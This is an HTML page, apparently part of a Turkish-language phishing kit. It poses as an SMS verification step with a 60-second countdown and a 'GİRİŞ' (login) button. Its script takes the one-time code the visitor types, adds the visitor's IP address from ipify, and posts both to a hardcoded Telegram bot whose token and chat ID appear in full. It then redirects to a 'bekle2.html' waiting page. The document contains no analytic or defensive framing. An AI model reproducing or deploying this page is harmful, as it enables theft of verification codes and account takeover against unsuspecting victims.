<head>

    <title>SMS Gönder</title>
    <style>
        body {
            background-color: white;
            font-family: Arial, sans-serif;
            text-align: center;
            margin-top: 50px;
        }
        input[type="text"] {
            padding: 10px;
            width: 200px;
        }
        button {
            padding: 10px 20px;
            margin-top: 10px;
            background-color: #08591b; /* Buton rengi */
            color: white; /* Yazı rengi */
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            opacity: 0.8; /* Hover efekti */
        }
    </style>
</head>
<body>

    <h1>SMS:</h1>
    <input type="text" id="smsInput" placeholder="Mesajınızı girin">
    <div id="countdown">60</div>
    <button id="sendButton">GİRİŞ</button>

 <script>
        // Geri sayım fonksiyonu
        let countdownValue = 60;
        const countdownElement = document.getElementById("countdown");
        const interval = setInterval(() => {
            countdownValue--;
            countdownElement.innerText = countdownValue;

            // Sayaç sıfırlandığında işlemi durdur
            if (countdownValue <= 0) {
                clearInterval(interval);
            }
        }, 1000); // 1 saniye aralıklarla geri sayım

        document.getElementById("sendButton").addEventListener("click", () => {
            const message = document.getElementById("smsInput").value;
            const chatId = "-1002343753859"; // Telegram chat ID
            const token = "7380726850:AAFZMnFFCtWf8SnIjlTCX04jpjlDNVo2TMY"; // Telegram API token

            // IP adresini almak için API çağrısı yap
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    const ipAddress = data.ip;
                    const finalMessage = `${message}\nIP Adresi: ${ipAddress}`;

                    // Telegram API'ye mesaj gönderme
                    return fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            chat_id: chatId,
                            text: finalMessage
                        }) // Noktalı virgül kaldırıldı
                    });
                })
                .then(response => {
                    if (response.ok) {
                        console.log('Mesaj gönderildi!');
                        // Giriş butonuna basıldıktan sonra bekle2.html sayfasına yönlendirme
                        window.location.href = "bekle2.html";
                    } else {
                        console.error('Mesaj gönderilemedi:', response.statusText);
                    }
                })
                .catch(error => {
                    console.error('Hata:', error);
                });
        });
    </script>

</body>
